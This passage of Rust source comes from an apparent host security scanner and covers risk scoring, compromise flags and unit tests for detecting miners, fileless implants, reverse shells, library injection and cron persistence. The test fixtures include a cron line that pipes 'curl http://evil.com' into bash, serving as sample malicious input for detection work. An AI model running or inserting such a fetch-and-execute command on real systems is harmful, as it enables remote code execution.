    pub findings: Vec<Finding>,
}

#[allow(dead_code)]
pub fn score(findings: Vec<Finding>) -> ScoredReport {
    let mut sec = 0u8;
    let mut rel = 0u8;
    let mut hyg = 0u8;

    for f in &findings {
        if f.suppressed.is_some() {
            continue;
        }
        match f.category {
            Category::Security => sec = sec.saturating_add(f.weight),
            Category::Reliability => rel = rel.saturating_add(f.weight),
            Category::Hygiene => hyg = hyg.saturating_add(f.weight),
        }
    }

    ScoredReport {
        total: (sec.min(60) + rel.min(30) + hyg.min(10)).min(100),
        security: sec.min(60),
        reliability: rel.min(30),
        hygiene: hyg.min(10),
        findings,
    }
}

// ── Legacy CriticalFlags (unchanged API, backed by findings) ──

pub struct CriticalFlags {
    pub firewall_disabled: bool,
    pub ssh_root_login: bool,
    pub security_updates: bool,
    pub critical_ssl: bool,
    pub failed_services: bool,
    pub no_backups: bool,
    pub sudo_nopasswd: bool,
    pub ntp_not_synced: bool,
    pub sysctl_issues_count: usize,
    /// At least one active-compromise (IoC) finding fired. Orthogonal to the
    /// hygiene flags above; drives a distinct exit code in main.rs.
    pub compromised_host: bool,
}

impl CriticalFlags {
    pub fn from_report(report: &AgentReport) -> Self {
        let findings = evaluate(report);
        Self::from_findings(&findings)
    }

    pub fn from_findings(findings: &[Finding]) -> Self {
        let has = |id: &str| {
            findings
                .iter()
                .any(|f| f.id == id && f.suppressed.is_none())
        };
        // Active-compromise (IoC) finding IDs. SEC-018 is deliberately excluded:
        // it is cron-persistence suspicion (weight 20), not a confirmed live IoC.
        // SEC-025 is likewise excluded: it is a downgraded ghost-PID suspicion
        // (young/racy/unconfirmable), not a confirmed hidden process.
        // SEC-026 is excluded: suspicious memory mappings (anon/rwx) are not
        // confirmed active compromise, but may indicate JIT or driver activity.
        // SEC-028 is included: deep-confirmed unattributed payload = live IoC.
        const IOC_IDS: [&str; 11] = [
            "SEC-015", "SEC-016", "SEC-017", "SEC-019", "SEC-020", "SEC-021", "SEC-022", "SEC-023",
            "SEC-024", "SEC-028", "DOCK-010",
        ];
        let count_sysctl = findings
            .iter()
            .filter(|f| f.id == "SEC-007" && f.suppressed.is_none())
            .count();

        Self {
            firewall_disabled: has("SEC-001"),
            ssh_root_login: has("SEC-002"),
            security_updates: has("SEC-003"),
            critical_ssl: has("SEC-004"),
            failed_services: has("REL-001"),
            no_backups: has("REL-002"),
            sudo_nopasswd: has("SEC-005"),
            ntp_not_synced: has("HYG-001"),
            sysctl_issues_count: count_sysctl,
            compromised_host: IOC_IDS.iter().any(|&id| has(id)),
        }
    }

    pub fn has_critical(&self) -> bool {
        self.firewall_disabled
            || self.ssh_root_login
            || self.security_updates
            || self.critical_ssl
            || self.failed_services
            || self.no_backups
            || self.sudo_nopasswd
            || self.ntp_not_synced
            || self.sysctl_issues_count >= SYSCTL_CRITICAL_THRESHOLD
    }

    /// True when at least one active-compromise (IoC) finding fired. Orthogonal
    /// to `has_critical()`: a host can be compromised with no standard hygiene
    /// critical, and vice-versa. main.rs maps this to a distinct exit code so
    /// CI/CD can page (compromise) separately from failing the build (critical).
    #[allow(dead_code)]
    pub fn is_compromised(&self) -> bool {
        self.compromised_host
    }
}

// ── Tests ─────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::*;

    fn minimal_report() -> AgentReport {
        AgentReport {
            scan_id: "test-id".to_string(),
            timestamp: "2025-01-01T00:00:00Z".to_string(),
            version: "0.4.0".to_string(),
            duration_secs: 1.0,
            risk_score: 0,
            is_root_execution: true,
            scan_warnings: Vec::new(),
            coverage_warnings: Vec::new(),
            scoring_version: 1,
            self_integrity: None,
            host: HostInfo::default(),
            databases: vec![],
            network: NetworkInfo::default(),
            storage: StorageInfo::default(),
            topology: TopologyInfo::default(),
            security: SecurityInfo::default(),
            packages: PackagesInfo::default(),
        }
    }

    fn rel_container(name: &str) -> ContainerInfo {
        ContainerInfo {
            name: name.into(),
            image: "img".into(),
            state: "running".into(),
            status: "Up 2 hours".into(),
            size_mb: 0,
            log_size_mb: 0,
            ports: vec![],
            mounts: vec![],
            privileged: false,
            memory_limit_mb: Some(512),
            cpu_limit: Some(1.0),
            cap_add: vec![],
            sensitive_mounts: vec![],
            restart_count: 0,
            oom_killed: false,
            health_status: None,
            rw_size_mb: 0,
            runtime_bounding_caps: None,
        }
    }

    #[test]
    fn risk_score_never_exceeds_100() {
        let mut r = minimal_report();
        r.network.firewall_active = false;
        r.security.ssh_root_login_enabled = true;
        r.security.ssh_password_auth_enabled = true;
        r.host.backup_tools = vec![];
        r.host.oom_kills = 5;
        r.host.ntp_synchronized = false;
        r.security.sudo_nopasswd_entries = vec!["ALL".to_string()];
        r.security.sysctl_issues = vec!["a".to_string(); 10];
        for _ in 0..5 {
            r.packages.upgradable.push(UpgradablePackage {
                name: "pkg".to_string(),
                current_version: "1.0".to_string(),
                new_version: "1.1".to_string(),
                is_security: true,
            });
        }

        let scored = score(evaluate(&r));
        assert!(scored.total <= 100);
    }

    #[test]
    fn new_scoring_caps_categories() {
        let mut r = minimal_report();
        r.network.firewall_active = false;
        r.security.ssh_root_login_enabled = true;
        r.security.ssh_password_auth_enabled = true;
        r.security.sudo_nopasswd_entries = vec!["ALL".to_string()];
        let scored = score(evaluate(&r));
        assert!(scored.security <= 60);
        assert!(scored.total <= 100);
    }

    #[test]
    fn suppressed_findings_not_scored() {
        let mut r = minimal_report();
        r.network.firewall_active = true;
        r.security.ssh_password_auth_enabled = false;
        r.host.backup_tools = vec!["restic".to_string()];
        r.host.ntp_synchronized = true;
        r.security.sysctl_issues = vec!["net.ipv4.ip_forward=1 (expected 0)".to_string()];
        r.topology.docker_active = true;

        let findings = evaluate(&r);
        assert!(findings.iter().any(|f| f.suppressed.is_some()));
        let scored = score(findings);
        assert_eq!(scored.total, 0);
    }

    #[test]
    fn docker_reliability_findings() {
        let mut r = minimal_report();
        let mut oom = rel_container("db");
        oom.oom_killed = true;
        let mut looper = rel_container("worker");
        looper.restart_count = 5;
        let mut live = rel_container("api");
        live.state = "restarting".into();
        let mut sick = rel_container("web");
        sick.health_status = Some("unhealthy".into());
        let ok = rel_container("cache");
        r.topology.containers = vec![oom, looper, live, sick, ok];

        let findings = evaluate(&r);
        let ids: Vec<&str> = findings.iter().map(|f| f.id).collect();
        assert!(ids.contains(&"DOCK-007"));
        assert!(ids.contains(&"DOCK-008"));
        assert!(ids.contains(&"DOCK-009"));
        assert!(
            findings
                .iter()
                .filter(|f| f.id.starts_with("DOCK-00"))
                .all(|f| !f.evidence.contains("cache"))
        );
        assert!(score(findings).reliability <= 30);
    }

    #[test]
    fn cap001_weight_escalates_on_global_exposure() {
        use crate::models::{PortInfo, ProcCapFinding};
        let mut r = minimal_report();
        r.security.capability_audit = vec![ProcCapFinding {
            pid: 4242,
            comm: "nginx".into(),
            euid: 101,
            effective: 0xa804_25fb,
            permitted: 0xa804_25fb,
            inheritable: 0,
            bounding: 0xa804_25fb,
            ambient: 0,
            no_new_privs: Some(false),
            seccomp: Some(2),
            critical_caps: vec!["CAP_NET_RAW".into()],
            reason: None,
        }];
        r.network.listening_ports = vec![PortInfo {
            protocol: "tcp".into(),
            port: "8080".into(),
            process: "nginx".into(),
            bind_address: "0.0.0.0".into(),
            pid: Some(4242),
            exe_path: None,
        }];
        let cap = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-001")
            .expect("CAP-001 present");
        assert_eq!(cap.weight, 20);
        assert!(cap.evidence.contains("1 exposed globally"));

        // Same finding, but bound to loopback → no escalation, weight stays 8.
        r.network.listening_ports[0].bind_address = "127.0.0.1".into();
        let cap = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-001")
            .unwrap();
        assert_eq!(cap.weight, 8);
        assert!(cap.evidence.contains("1 of these listening"));
        assert!(!cap.evidence.contains("exposed globally on"));

        // IPv4-mapped IPv6 wildcard must count as global exposure too.
        r.network.listening_ports[0].bind_address = "::ffff:0.0.0.0".into();
        let cap = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-001")
            .unwrap();
        assert_eq!(cap.weight, 20);
    }

    #[test]
    fn sec015_fires_only_on_full_ioc_triad() {
        use crate::models::{PortInfo, ProcCapFinding};
        let cap = |pid| ProcCapFinding {
            pid,
            comm: "kdevtmpfsi".into(),
            euid: 1000,
            effective: 0x20_0000,
            permitted: 0x20_0000,
            inheritable: 0,
            bounding: 0x20_0000,
            ambient: 0,
            no_new_privs: Some(false),
            seccomp: Some(0),
            critical_caps: vec!["CAP_SYS_ADMIN".into()],
            reason: None,
        };
        let port = |bind: &str, exe: Option<&str>, pid| PortInfo {
            protocol: "tcp".into(),
            port: "31337".into(),
            process: "x".into(),
            bind_address: bind.into(),
            pid,
            exe_path: exe.map(Into::into),
        };
        let fires = |r: &AgentReport| evaluate(r).iter().any(|f| f.id == "SEC-015");

        // Full triad → fires, weight 60, evidence carries pid/exe/caps.
        let mut r = minimal_report();
        r.security.capability_audit = vec![cap(4242)];
        r.network.listening_ports = vec![port("0.0.0.0", Some("/tmp/kdevtmpfsi"), Some(4242))];
        assert!(fires(&r));
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-015")
            .unwrap();
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("4242"));
        assert!(f.evidence.contains("/tmp/kdevtmpfsi"));
        assert!(f.evidence.contains("CAP_SYS_ADMIN"));

        // Each missing leg suppresses the IoC:
        r.network.listening_ports = vec![port("127.0.0.1", Some("/tmp/kdevtmpfsi"), Some(4242))];
        assert!(!fires(&r), "loopback bind is not reachable");
        r.network.listening_ports = vec![port("0.0.0.0", Some("/usr/bin/nginx"), Some(4242))];
        assert!(!fires(&r), "system path is not ephemeral");
        r.network.listening_ports = vec![port("0.0.0.0", Some("/tmp/kdevtmpfsi"), Some(9999))];
        assert!(
            !fires(&r),
            "pid absent from capability_audit is only SEC-013"
        );

        // Mapped wildcard counts too (shares is_wildcard_bind contract).
        r.network.listening_ports = vec![port("::ffff:0.0.0.0", Some("/dev/shm/x"), Some(4242))];
        assert!(fires(&r));
    }

    #[test]
    fn sec016_reads_suspicious_processes() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![SuspiciousProcess {
            pid: 1337,
            name: "xmrig".into(),
            exe_path: Some("/tmp/xmrig".into()),
            ..Default::default()
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-016")
            .unwrap();
        assert_eq!(f.weight, 60);
        assert!(
            f.evidence.contains("xmrig")
                && f.evidence.contains("1337")
                && f.evidence.contains("/tmp/xmrig")
        );

        let clean = minimal_report();
        assert!(!evaluate(&clean).iter().any(|f| f.id == "SEC-016"));
    }

    #[test]
    fn sec017_flags_fileless_and_sec016_excludes_it() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![
            // fileless, name NOT in blocklist → SEC-017 only
            SuspiciousProcess {
                pid: 42,
                name: "obfuscated".into(),
                exe_path: Some("/dev/shm/loader".into()),
                is_deleted: true,
                euid: 1000,
                is_mimic: false,
            },
            // known miner, live → SEC-016 only
            SuspiciousProcess {
                pid: 7,
                name: "xmrig".into(),
                exe_path: Some("/tmp/xmrig".into()),
                is_deleted: false,
                euid: 1000,
                is_mimic: false,
            },
        ];
        let ids: Vec<&str> = evaluate(&r).iter().map(|f| f.id).collect();
        assert!(ids.contains(&"SEC-016"));
        assert!(ids.contains(&"SEC-017"));

        let sec016 = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-016")
            .unwrap();
        assert!(sec016.evidence.contains("xmrig"));
        assert!(
            !sec016.evidence.contains("obfuscated"),
            "fileless non-name must not be in SEC-016"
        );
        let sec017 = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-017")
            .unwrap();
        assert!(
            sec017.evidence.contains("obfuscated") && sec017.evidence.contains("/dev/shm/loader")
        );
        assert!(
            !sec017.evidence.contains("xmrig"),
            "live miner must not be in SEC-017"
        );
    }

    #[test]
    fn sec017_evidence_distinguishes_memfd_from_ondisk() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![
            SuspiciousProcess {
                pid: 10,
                name: "malware".into(),
                exe_path: Some("/tmp/malware".into()),
                is_deleted: true,
                euid: 1000,
                is_mimic: false,
            },
            SuspiciousProcess {
                pid: 20,
                name: "stealth".into(),
                exe_path: Some("/memfd:stealth".into()),
                is_deleted: true,
                euid: 1000,
                is_mimic: false,
            },
        ];
        let sec017 = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-017")
            .unwrap();
        assert!(sec017.evidence.contains("deleted from /tmp/malware"));
        assert!(sec017.evidence.contains("executing in-memory (memfd)"));
        assert!(!sec017.evidence.contains("deleted from /memfd:stealth"));
    }

    #[test]
    fn sec018_detects_critical_cron() {
        use crate::models::{CronJob, CronSeverity};
        let mut r = minimal_report();
        r.host.cron_jobs = vec![
            CronJob {
                command: "0 3 * * * root /usr/bin/backup".into(),
                severity: CronSeverity::Ok,
            },
            CronJob {
                command: "* * * * * root curl http://evil.com | bash -c".into(),
                severity: CronSeverity::Critical,
            },
        ];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-018")
            .expect("SEC-018 missing");
        assert_eq!(f.weight, 20);
        assert!(f.evidence.contains("curl"));
    }

    #[test]
    fn dock010_flags_undeclared_runtime_caps() {
        use crate::models::ContainerInfo;
        let base = |bnd: Option<u64>, cap_add: Vec<String>, privileged: bool| ContainerInfo {
            name: "web".into(),
            image: "nginx".into(),
            state: "running".into(),
            status: "Up".into(),
            size_mb: 0,
            log_size_mb: 0,
            ports: vec![],
            mounts: vec![],
            privileged,
            memory_limit_mb: None,
            cpu_limit: None,
            cap_add,
            sensitive_mounts: vec![],
            restart_count: 0,
            oom_killed: false,
            health_status: None,
            rw_size_mb: 0,
            runtime_bounding_caps: bnd,
        };
        let tampered = 0x0000_0000_a804_25fb | (1u64 << 21); // Moby default + SYS_ADMIN

        // Empty cap_add but SYS_ADMIN live → tamper, weight 60.
        let mut r = minimal_report();
        r.topology.containers = vec![base(Some(tampered), vec![], false)];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "DOCK-010")
            .expect("DOCK-010 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("web") && f.evidence.contains("CAP_SYS_ADMIN"));

        // Declared via cap_add → not undeclared → no finding.
        r.topology.containers = vec![base(Some(tampered), vec!["SYS_ADMIN".into()], false)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));

        // Privileged → suppressed (DOCK-003 territory).
        r.topology.containers = vec![base(Some(tampered), vec![], true)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));

        // Clean default bounding → no finding.
        r.topology.containers = vec![base(Some(0x0000_0000_a804_25fb), vec![], false)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));

        // Not running / non-root (None) → skipped.
        r.topology.containers = vec![base(None, vec![], false)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));
    }

    #[test]
    fn sec019_root_fileless_fires_without_audit_and_nonroot_joins() {
        use crate::models::{ProcCapFinding, SuspiciousProcess};
        let fires = |r: &AgentReport| evaluate(r).iter().any(|f| f.id == "SEC-019");
        let cap = |pid: u32, caps: Vec<String>| ProcCapFinding {
            pid,
            comm: "obfuscated".into(),
            euid: 1000,
            effective: 1 << 21,
            permitted: 1 << 21,
            inheritable: 0,
            bounding: 0,
            ambient: 0,
            no_new_privs: Some(false),
            seccomp: Some(0),
            critical_caps: caps,
            reason: None,
        };
        let fileless = |pid: u32, euid: u32, exe: Option<&str>| SuspiciousProcess {
            pid,
            name: "obfuscated".into(),
            exe_path: exe.map(Into::into),
            is_deleted: true,
            euid,
            is_mimic: false,
        };

        // Branch A — ROOT fileless, capability_audit EMPTY → SEC-019 still fires.
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(1, 0, Some("/dev/shm/loader"))];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-019")
            .expect("root fileless must fire SEC-019 without a join");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("pid 1"));
        assert!(
            f.evidence
                .contains("root-run fileless implant, full kernel capabilities by default")
        );
        assert!(f.evidence.contains("deleted from /dev/shm/loader"));

        // Branch B — non-root fileless WITH critical caps → fires with cap list.
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"))];
        r.security.capability_audit = vec![cap(42, vec!["CAP_SYS_ADMIN".into(), "CAP_BPF".into()])];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-019")
            .unwrap();
        assert!(f.evidence.contains("holds [CAP_SYS_ADMIN, CAP_BPF]"));
        assert!(!f.evidence.contains("root-run"));

        // Branch B — non-root fileless WITHOUT caps → suppressed (SEC-017 still fires).
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"))];
        assert!(
            !fires(&r),
            "non-root fileless without caps must not raise SEC-019"
        );
        assert!(evaluate(&r).iter().any(|f| f.id == "SEC-017"));

        // Branch B — non-root, ambient-only audit entry (empty critical_caps) → suppressed.
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"))];
        r.security.capability_audit = vec![cap(42, vec![])];
        assert!(!fires(&r), "ambient-only entry must not raise SEC-019");

        // Branch A — memfd root: phrasing matches SEC-017, no "deleted from".
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(900, 0, Some("/memfd:stealth"))];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-019")
            .unwrap();
        assert!(f.evidence.contains("executing in-memory (memfd)"));
        assert!(f.evidence.contains("root-run fileless implant"));
        assert!(!f.evidence.contains("deleted from /memfd:"));
    }

    #[test]
    fn compromised_host_flag_tracks_ioc_findings() {
        use crate::models::SuspiciousProcess;

        // Clean report → no IoC finding → not compromised.
        let clean = minimal_report();
        let cf = CriticalFlags::from_report(&clean);
        assert!(!cf.compromised_host);
        assert!(!cf.is_compromised());

        // An IoC (SEC-016 via a known-malware name) → compromised_host = true.
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![SuspiciousProcess {
            pid: 1337,
            name: "xmrig".into(),
            exe_path: Some("/tmp/xmrig".into()),
            ..Default::default()
        }];
        let cf = CriticalFlags::from_report(&r);
        assert!(cf.compromised_host, "SEC-016 must set compromised_host");
        assert!(cf.is_compromised());

        // A standard hygiene critical (firewall off → SEC-001) is NOT a compromise:
        // has_critical() true, compromised_host false — the two are orthogonal.
        let mut r = minimal_report();
        r.network.firewall_active = false;
        let cf = CriticalFlags::from_report(&r);
        assert!(cf.has_critical(), "SEC-001 is a standard critical");
        assert!(
            !cf.compromised_host,
            "hygiene critical must not set compromise"
        );

        // SEC-018 (cron persistence) must NOT count as compromise.
        use crate::models::{CronJob, CronSeverity};
        let mut r = minimal_report();
        r.host.cron_jobs = vec![CronJob {
            command: "* * * * * root curl http://evil | bash -c".into(),
            severity: CronSeverity::Critical,
        }];
        let cf = CriticalFlags::from_report(&r);
        assert!(
            evaluate(&r).iter().any(|f| f.id == "SEC-018"),
            "SEC-018 fires"
        );
        assert!(
            !cf.compromised_host,
            "cron persistence is not an active compromise"
        );
    }

    #[test]
    fn sec020_mimic_sets_compromised_host() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![SuspiciousProcess {
            pid: 100,
            name: "kworker/0:1".into(),
            exe_path: Some("/tmp/kdevtmpfsi".into()),
            is_mimic: true,
            ..Default::default()
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-020")
            .expect("SEC-020 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("kworker/0:1") && f.evidence.contains("/tmp/kdevtmpfsi"));
        assert!(
            CriticalFlags::from_report(&r).compromised_host,
            "mimic must set compromise"
        );
    }

    #[test]
    fn sec021_mount_masking_sets_compromised_host() {
        use crate::models::MountMaskingFinding;
        let mut r = minimal_report();
        r.security.mount_masking = vec![MountMaskingFinding {
            target_path: "/proc/1337".into(),
            mount_source: "tmpfs".into(),
            fstype: "tmpfs".into(),
            reason: "overlay hides a PID from /proc (process masking)".into(),
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-021")
            .expect("SEC-021 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("/proc/1337"));
        assert!(
            CriticalFlags::from_report(&r).compromised_host,
            "mount masking must set compromise"
        );
    }

    #[test]
    fn sec022_reverse_shell_sets_compromised_host() {
        use crate::models::ReverseShellFinding;
        let mut r = minimal_report();
        r.security.reverse_shells = vec![ReverseShellFinding {
            pid: 4444,
            process: "bash".into(),
            exe_path: Some("/usr/bin/bash".into()),
            remote_address: "203.0.113.5:443".into(),
            stdio_fd: Some(1),
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-022")
            .expect("SEC-022 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("203.0.113.5:443"));
        assert!(f.evidence.contains("stdout"));
        assert!(
            CriticalFlags::from_report(&r).compromised_host,
            "reverse shell must set compromise"
        );
    }

    #[test]
    fn sec023_library_injection_sets_compromised_host() {
        use crate::models::LibraryInjectionFinding;
        let mut r = minimal_report();
        r.security.library_injections = vec![LibraryInjectionFinding {
            pid: 2222,
            process: "sshd".into(),
            object_path: "/tmp/hide.so".into(),
            source: "LD_PRELOAD".into(),
            is_deleted: false,
            region_addr: None,
            deep_forensics: None,
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-023")
            .expect("SEC-023 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("/tmp/hide.so"));
        assert!(f.evidence.contains("LD_PRELOAD"));
        assert!(
            CriticalFlags::from_report(&r).compromised_host,
            "library injection must set compromise"
        );
    }

    #[test]
    fn sec024_confirmed_ghost_sets_compromised_host() {
        use crate::models::GhostPidFinding;
        let mut r = minimal_report();
        r.security.ghost_pids = vec![GhostPidFinding {
            pid: 31337,
            state: Some("R".into()),
            age_secs: Some(3600),
            confirmed_via: "stat-path+kill".into(),
            confirmed_ioc: true,
            holds_socket: true,
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-024")
            .expect("SEC-024 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("31337"));
        assert!(f.evidence.contains("holds socket"));
        assert!(
            CriticalFlags::from_report(&r).compromised_host,
            "confirmed ghost PID must set compromise"
        );
    }

    #[test]
    fn sec025_downgraded_ghost_does_not_set_compromise() {
        use crate::models::GhostPidFinding;
        let mut r = minimal_report();
        // Young candidate (age < 2s) → downgraded, must NOT escalate to exit-3.
        r.security.ghost_pids = vec![GhostPidFinding {
            pid: 4242,
            state: Some("R".into()),
            age_secs: Some(1),
            confirmed_via: "stat-path".into(),
            confirmed_ioc: false,
            holds_socket: false,
        }];
        assert!(
            evaluate(&r).iter().any(|f| f.id == "SEC-025"),
            "SEC-025 downgraded finding fires"
        );
        assert!(
            !evaluate(&r).iter().any(|f| f.id == "SEC-024"),
            "no hard SEC-024 for a young candidate"
        );
        assert!(
            !CriticalFlags::from_report(&r).compromised_host,
            "downgraded ghost must not set compromise"
        );
    }
}
